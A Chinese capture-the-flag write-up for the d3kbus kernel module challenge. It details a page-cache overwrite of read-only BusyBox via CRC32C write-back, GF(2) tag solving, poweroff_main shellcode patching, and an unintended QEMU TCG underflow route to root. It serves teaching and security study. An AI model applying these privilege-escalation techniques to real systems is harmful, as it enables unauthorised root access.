# d3kbus

## 题目简述

题目给出了 Linux 7.1.4 内核、`rootfs.qcow2`、内核配置和 QEMU 启动脚本。系统启动后会加载 `/root/d3kbus.ko`，并创建所有用户均可访问的 `/dev/d3kbus`。flag 被复制到 `/flag`，权限设为 `root:root 0400`，随后以 `ctf` 用户启动交互 shell：

```sh
chown root:root /flag
chmod 0400 /flag
insmod /root/d3kbus.ko

cd /home/ctf
su ctf -c sh

poweroff -d 0 -f
```

`run.sh` 开启了 KASLR、KPTI、SMEP、SMAP，内核配置中还启用了 slab freelist random/hardening，并设置了 `oops=panic panic=1`。因此，依赖内核地址泄漏和内核 ROP 的方案既复杂又脆弱。模块真正的问题是一个数据完整性漏洞：普通用户可以让模块把计算出的 CRC32C 写回只读文件的 page cache，最终得到受控的 4 字节覆盖。

利用时修改静态链接的 `/bin/busybox` 中 `poweroff_main`。杀死当前 `ctf` shell 后，root 身份的启动脚本继续执行 `poweroff`，从而运行被替换的代码并读取 `/flag`。整个过程不需要知道内核基址，也不需要在内核态执行 shellcode。

附件及关键文件指纹如下：

```text
rootfs.qcow2
d39a46f33cb9c413cb320d0ae3a6120f03fcbce51b6755fb9cdc180608c3799d

/root/d3kbus.ko（从原始 rootfs 提取）
52f158bf1de001d67ec8b5a1d7b3edd1c50fb05e873db2ed6749c2f3b6fc6f4f

/bin/busybox（从原始 rootfs 提取）
bbc4c150f0dd092062cda5430c6e795a8fb444a75fe74f61e847db2ac58634bf
```

## 解题过程

### 1. 还原 d3kbus 接口

模块保留了 DWARF 调试信息和大部分符号，逆向入口主要是：

```text
d3kbus_ioctl_create
d3kbus_ioctl_subscribe
d3kbus_producer_write_iter
d3kbus_producer_splice_write
d3kbus_segment_take_external_page
d3kbus_frame_prepare_crc32c
d3kbus_frame_validate_crc32c_commit
d3kbus_frame_commit_crc32c
```

控制设备支持两个关键 ioctl：

```c
#define D3KBUS_IOC_CREATE    0xC0186101
#define D3KBUS_IOC_SUBSCRIBE 0xC0286102

struct d3kbus_ioc_create {
    uint32_t queue_limit;
    uint16_t max_subscribers;
    uint16_t flags;
    int32_t  producer_fd;       /* out */
    uint32_t channel_id;        /* out */
    uint64_t channel_cookie;    /* out */
};                              /* sizeof = 24 */

struct d3kbus_ioc_subscribe {
    uint64_t channel_cookie;
    uint32_t flags;
    uint32_t window_offset;
    uint32_t window_length;
    uint32_t stream_value;
    uint32_t stream_mask;
    int32_t  subscriber_fd;     /* out */
    uint32_t reserved[2];
};                              /* sizeof = 40 */
```

创建 channel 后，模块返回一个 producer fd；使用 `channel_cookie` 订阅后会返回 subscriber fd。向 producer 发送的数据由 32 字节 wire header 和 payload 组成：

```c
struct d3kbus_wire_header {
    uint32_t magic;             /* 0x3361626e, "nba3" */
    uint16_t header_length;     /* 32 */
    uint16_t flags;
    uint32_t payload_length;
    uint32_t stream_id;
    uint32_t user_tag;
    uint32_t reserved;
    uint64_t opaque;
} __attribute__((packed));
```

模块会针对每个订阅者生成 projected frame。投影后的帧头为：

```c
struct d3kbus_frame_header {
    uint32_t magic;             /* 0x74747261, "artt" */
    uint16_t header_length;     /* 48 */
    uint16_t flags;
    uint32_t channel_id;
    uint32_t stream_id;
    uint64_t sequence;
    uint64_t opaque;
    uint32_t user_tag;
    uint32_t payload_length;
    uint32_t window_offset;
    uint32_t reserved;
} __attribute__((packed));
```

订阅者的 `flags` 中，`0x02` 表示保留 shared external 数据，`0x04` 表示为投影计算 CRC32C。利用设置一个长度为 20 的投影窗口。模块把窗口最后 4 字节视为 deferred CRC trailer，CRC 覆盖 48 字节 projected header 和 payload 的前 16 字节：

```text
projected frame
┌──────────────────── 48 bytes ────────────────────┐
│ frame header（其中 user_tag 可控）                │
├──────────────────── 16 bytes ────────────────────┤
│ payload prefix                                   │
├──────────────────── 4 bytes ─────────────────────┤
│ deferred CRC32C trailer                          │
└──────────────────────────────────────────────────┘
```

CRC32C 使用反射多项式 `0x82f63b78`，初值为 `0xffffffff`，结束后再按位取反。

### 2. 漏洞成因：CRC 被写回只读文件页

当 payload 通过 splice 路径进入 producer 时，模块可以不复制内容，而是把来源的 page-cache page 记录为 external segment。这个 segment 保存了：

- 原始 `struct page`；
- 对应 inode 和 mapping；
- 页内偏移及 page index；
- 用于检查内容是否变化的 snapshot page。

投影开启 shared external 和 CRC 后，deferred trailer 仍然可以引用原 external page。`d3kbus_frame_commit_crc32c()` 会锁住目标页，并重新检查 inode、mapping、page index 和 snapshot。检查都通过后，它直接把计算出的 32 位 CRC 写到原页面：

```c
/* 等价逻辑，省略锁和引用计数 */
if (inode_mapping_page_and_snapshot_still_match(segment)) {
    void *address = kmap_local_page(segment->page);
    *(uint32_t *)(address + trailer_offset) = calculated_crc32c;
    kunmap_local(address);
}
```

这些检查只能证明“页面仍是原来的页面”，却没有证明调用者对来源文件具有写权限，也没有拒绝只读 fd、不可写 inode 或可执行文件。于是：

```text
open("/bin/busybox", O_RDONLY)
        │
        ▼
把其 page-cache page 送入 d3kbus external segment
        │
        ▼
模块以 CRC trailer 的名义写回 4 字节
        │
        ▼
只读 BusyBox 的 page cache 被普通用户修改
```

这就是最终利用原语：对已知文件偏移实施一次 4 字节 page-cache 覆盖。

### 3. 触发 external CRC 回写的三个隐藏条件

仅按表面 ABI 创建 channel、订阅并 splice 文件不会成功。调试 `d3kbus_external_page_candidate()`、`d3kbus_external_page_allowed_locked()`、snapshot attach、CRC prepare/validate/commit 路径后，确认还必须满足三个条件。

| 容易失败的做法 | 失败原因 | 最终做法 |
| --- | --- | --- |
| `pipe2()` 后 `splice(file → pipe → producer)` | 用户管道的 `pipe->files` 非零，模块把 segment 降级为私有复制 | 直接调用 `sendfile(producer_fd, file_fd, ...)` |
| 只创建一个订阅者 | 单订阅者投递路径不会保留可回写的 shared external trailer | `max_subscribers=2`，实际创建两个相同订阅者 |
| 输入段和窗口都为 20 字节 | 窗口覆盖完整 segment 时投影会私有化 | wire payload 为 24 字节，投影窗口只取前 20 字节 |

第一点最不直观。两个非管道 fd 之间的 `sendfile()` 会进入 `do_splice_direct()`，使用内核为当前任务维护的 `current->splice_pipe`；该内部管道没有用户态 pipe fd，因而满足模块的 external 判定。显式创建的普通管道即使传输了相同 page-cache page，也会进入复制分支。

最终每次覆盖均按下面的参数构造：

```text
channel.max_subscribers = 2
subscriber[0].flags      = 0x02 | 0x04
subscriber[1].flags      = 0x02 | 0x04
window_offset            = 0
window_length            = 20
wire.payload_length      = 24
```

subscriber fd 不需要读取。producer 完成一次 record 后，投影和 CRC commit 已在发布路径中执行；保留两个 fd 到提交结束即可。

### 4. 将 CRC32C 变成任意 4 字节写

CRC trailer 的值并非直接可控，但 projected header 中的 32 位 `user_tag` 完全可控，而且位于 CRC 覆盖范围内。固定 channel、sequence、其他 header 字段和 16 字节 payload prefix 后，可以把 CRC 看作 `user_tag` 到 32 位输出的仿射映射：

```text
F(t) = CRC32C(projected_header(user_tag=t) || payload_prefix[0:16])

base    = F(0)
delta_i = F(1 << i) xor base
```

若希望 trailer 最终写入 `wanted`，只需求解：

```text
Σ(t_i · delta_i) = wanted xor base
```

这是一个 32 元 GF(2) 线性方程组。exploit 依次计算 32 个单位向量的输出差分，建立以输出最高位为主元的线性基；再用同一组主元消去 `wanted xor base`，即可还原对应的 `user_tag`。本题参数下映射满秩，所以每一个 32 位目标值都有唯一解。写入前再计算一次 CRC，确保结果确实等于目标值。

设希望覆盖的 4 字节起始文件偏移为 `T`。选择：

```text
sendfile 起始偏移 S = T - 16
来源 segment 长度      = 24
投影窗口长度           = 20
```

窗口的前 16 字节参与 CRC，最后 4 字节是 deferred trailer，因此 trailer 恰好落在 `[T, T+4)`。完整的单次覆盖过程为：

```c
pread(target_fd, window, 20, T - 16);
tag = solve_user_tag(projected_header, window[0:16], wanted_u32);

write(producer_fd, &wire_header_with_tag, 32);
sendfile(producer_fd, target_fd, &offset_T_minus_16, 24);

pread(target_fd, check, 4, T);  /* 确认 page cache 已被修改 */
```

每个 4 字节块重新创建一个 channel 和两个订阅者，使 projected frame 的 `sequence` 固定为 1，也避免上一条 record 的队列状态影响下一次求解。

### 5. 选择稳定的 root 执行入口

rootfs 中的 BusyBox v1.36.0 是固定地址、静态链接的 ET_EXEC。启动脚本在 `ctf` shell 退出后必定以 root 执行：

```sh
poweroff -d 0 -f
```

逆向 BusyBox dispatcher 后定位到 `poweroff_main`：

```text
虚拟地址：0x5ea059
文件偏移：0x1ea059
```

附近原始指令为：

```asm
0x5ea050: add rsp, 0x310
0x5ea057: pop rbp
0x5ea058: ret
0x5ea059: endbr64          ; poweroff_main
0x5ea05d: push r13
0x5ea05f: mov rdi, rsi
```

CRC 原语要求目标地址按 4 字节对齐，因此从文件偏移 `0x1ea058` 开始覆盖。第一个字节放置 `NOP`，真正从 `poweroff_main` 入口 `0x1ea059` 执行时正好进入 shellcode 的第二个字节。利用前还会检查目标处的 16 字节指纹：

```text
c3 f3 0f 1e fa 41 55 48 89 f7 41 54 55 53 31 db
```

这样可以避免在 BusyBox 版本不符或目标已经被修改时盲目覆盖。

写入的 payload 共 64 字节，即 16 次 CRC 覆盖，逻辑如下：

```c
fd = open("/flag", O_RDONLY);
n = read(fd, rsp - 0x80, 0x7f);
write(STDOUT_FILENO, rsp - 0x80, n);
exit(0);
```

完成覆盖后，精简版 exploit 取得父进程 pid 并发送 `SIGKILL`。被杀死的是 `su ctf -c sh` 启动的 shell，root 的 `rcS` 随即继续调用 `poweroff`。新执行的 `/bin/busybox` 从已污染的 page cache 取指，`poweroff_main` 因而打印 `/flag`。

这是一条纯数据攻击链。KASLR、SMEP、SMAP、KPTI 都不会阻止普通 root 用户态进程执行 BusyBox 中已被替换的指令。

### 6. 非预期解：QEMU TCG 跨页访问下溢

官方 PDF 还记录了一条与 `d3kbus.ko` 无关的非预期解。比赛环境使用不带 KVM 的 QEMU TCG，而当时版本的 x86 访存辅助函数 `access_ptr()` 使用了下面这种无符号减法边界判断：

```c
if (offset <= ac->size1 - len)
    return ac->haddr1 + offset;

assert(offset <= ac->size - len);
```

当访问长度 `len` 大于剩余范围时，`size - len` 会发生无符号下溢，错误地变成一个很大的数。利用 x87 的 80 位 `FLD/FSTP` 在页尾发起 10 字节跨页访问，就可能让 TCG 返回越过合法 host buffer 的指针。公开利用先用 `perf_event` metadata page 和页表喷射控制相邻物理页，再通过这个越界读写泄露、篡改页表项，最终建立任意物理内存读写。

取得物理读写后，利用按 2 MiB 对齐扫描内核映像，用固定指令指纹定位内核基址，再把 `setuid` 权限检查附近的条件跳转从 `JE` 改为 `JNE`。随后执行 `setuid(0)` 即可获得 root 并读取 `/flag`。这条链绕过了题目模块本身，因而属于平台层非预期，而不是 `d3kbus` 的预期漏洞。

发现者公开文章 [QEMU 0day 分析](https://kqx.io/post/qemu-0day/)给出了 TCG `access_ptr` 下溢的完整背景；本文已概括其触发点和提权落点，不依赖外链也能理解利用链。官方给出的修复将减法改写为先验证被减数：

```c
if (offset <= ac->size1 && len <= ac->size1 - offset)
    return ac->haddr1 + offset;

assert(offset <= ac->size && len <= ac->size - offset);
```

跨入第二页时还必须确认 `haddr2` 非空。这样只有在 `offset` 与 `len` 均落入已验证范围后才会执行减法，不再产生下溢。该修复后来用于 revenge 环境；普通版仍可用这条 QEMU 路径非预期提权。

### 7. Exploit 与远程脚本

目录中提供两份等价 exploit：

- `exploit.c`：带完整错误信息和逐块校验，便于阅读与本地调试；使用 `--trigger` 时会自动杀死父 shell。
- `exploit_min.c`：不依赖 libc，只使用 x86-64 syscall，静态二进制约 9 KiB，适合通过串口远程上传。

编译：

```sh
make
```

`remote_solve.py` 使用 pwntools 建立 TLS 连接，等待 guest shell 真正启动后，把 `exploit_min` 以 Base64 分块上传到 `/tmp/d3exp`。脚本会在远端计算 SHA-256，确认文件没有被串口截断后才执行，并从输出中提取 flag。运行方式：

```sh
source /home/kali/miniforge3/etc/profile.d/conda.sh
conda activate ctf-tools
python remote_solve.py <host> 443
conda deactivate
```

远程上传所用二进制为：

```text
exploit_min
f3547094161a17f4681e045290d8b996373568c79bc7ea3be2f463b083b2937c
```

关键输出如下：

```text
[+] guest shell 就绪，上传 8864 字节 exploit
[+] 上传校验通过，触发漏洞
................
[+] patched; triggering root poweroff
Killed
d3ctf{I-WiIl-Ch4Ng3-th4t_woR1D-lNTo-soMetHinG-bEtT3R_HOney!0}
```

最终 flag：

```text
d3ctf{I-WiIl-Ch4Ng3-th4t_woR1D-lNTo-soMetHinG-bEtT3R_HOney!0}
```

## 方法总结

本题的核心并不是传统内核控制流劫持，而是模块错误地把“外部页面仍未变化”当成“允许修改外部页面”。snapshot、inode、mapping 和 page index 的复核只能防止竞态或页面替换，不能代替 VFS 写权限检查。最终得到的是对只读文件 page cache 的 4 字节覆盖。

利用链可以概括为：

```text
只读打开 BusyBox
  → sendfile 令 page-cache page 成为 external segment
  → 两个 shared-external + CRC 订阅者保留 deferred trailer
  → 用 user_tag 的 GF(2) 反解控制 CRC32C
  → 16 次 4 字节覆盖替换 poweroff_main
  → 结束 ctf shell
  → root rcS 调用 poweroff
  → shellcode 读取并输出 /flag
```

最关键的三个工程细节是：用 `sendfile()` 而不是显式用户管道、实际创建两个订阅者、让 20 字节投影窗口成为 24 字节来源段的严格子区间。缺少其中任何一个条件，数据都会被私有复制，CRC 只会落在模块自己的页面上，无法修改目标文件。

选择 `poweroff_main` 作为 root 触发点，则充分利用了题目已有的启动流程，不需要覆盖内核代码、泄漏地址或绕过 SMEP/SMAP。将 CRC 的可控输入建模为 GF(2) 仿射映射，又把看似只能写校验值的原语提升成了确定性的任意 32 位写，最终形成稳定、可重复的远程利用。

官方赛后材料还给出了 QEMU TCG `access_ptr()` 无符号减法下溢的非预期路径。它从 x87 跨页访问取得宿主侧越界读写，再把来宾页表提升为任意物理内存读写并修改内核权限检查。预期链和非预期链应分开理解：前者揭示模块把完整性检查误当授权检查，后者则是虚拟化平台本身的边界校验漏洞。
